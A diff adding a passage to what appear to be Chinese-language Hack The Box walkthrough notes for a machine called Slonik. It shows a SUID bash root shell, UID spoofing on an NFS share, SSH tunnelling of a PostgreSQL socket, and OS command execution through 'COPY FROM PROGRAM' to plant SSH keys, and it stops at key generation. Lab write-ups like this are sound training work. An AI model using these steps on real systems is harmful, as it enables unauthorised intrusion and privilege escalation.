@@ -99,3 +99,53 @@ bash-5.1$ ls -la /bin/bash
 bash-5.1$ /bin/bash -p
 bash-5.1# id
 ```
+
+#### psql数据库 From Slonik
+```
+所有端口的 TTL 值均显示为 63，这与一跳之外的 Linux 系统的预期 TTL 值相符
+showmount -e将列出NFS上可用的挂载点（份额）：
+[★]$ showmount -e 10.129.234.160
+Export list for 10.129.234.160:
+/var/backups *
+/home        *
+
+[★]$ mkdir /tmp/nfs
+[★]$ sudo mount -t nfs 10.129.234.160:/home /tmp/nfs
+[★]$ ls -la /tmp/nfs
+total 20
+drwxr-xr-x  3 root root  4096 Oct 24  2023 .
+drwxrwxrwt 20 root root 12288 Mar  9 07:12 ..
+drwxr-x---  5 1337 1337  4096 Sep 22 07:46 service
+[★]$ cd /tmp/nfs
+[★]$ sudo useradd service -u 1337
+[★]$ sudo su service
+sh: 1: [[: not found
+\[\033[1;32m\]\342\224\214\342\224\200[\[\033[1;37m\]\u\[\033[01;32m\]@\[\033[01;34m\]\h\[\033[1;32m\]]\342\224\200[\[\033[1;37m\]\w\[\033[1;32m\]]\n\[\033[1;32m\]\342\224\224\342\224\200\342\224\200\342\225\274 [\[\e[01;33m\]★\[\e[01;32m\]]$ \[\e[0m\]\[\033[1;32m\]bash
+
+service@htb-xybs8a7uq9:/tmp/nfs$ cat service/.bash_history
+
+service@htb-xybs8a7uq9:/tmp/nfs$ find / -name postgresql.conf 2>/dev/null
+/etc/postgresql/15/main/postgresql.conf
+
+//数据库 postgres
+[★]$ ssh -N -L /tmp/.s.PGSQL.5432:/var/run/postgresql/.s.PGSQL.5432 service@10.129.234.160
+[★]$ psql -h /tmp -U postgres
+postgres=# \du
+postgres=# \c
+postgres=# \l
+postgres=# \c service
+service=# \dt
+service=# select * from users;
+
+service=# CREATE TABLE cmd(output text); 
+service=# COPY cmd FROM  PROGRAM 'id'; 
+COPY 1
+service=# select * from cmd; 
+service=# COPY cmd FROM PROGRAM 'mkdir -p /var/lib/postgresql/.ssh';
+COPY 0
+service=# COPY cmd FROM PROGRAM 'chmod 700 /var/lib/postgresql/.ssh';
+COPY 0
+
+[~][★]$ ssh-keygen -t ed25519 //本地生成公钥
+[~][★]$ cat /home/syareya55/.ssh/id_ed25519.pub
+```
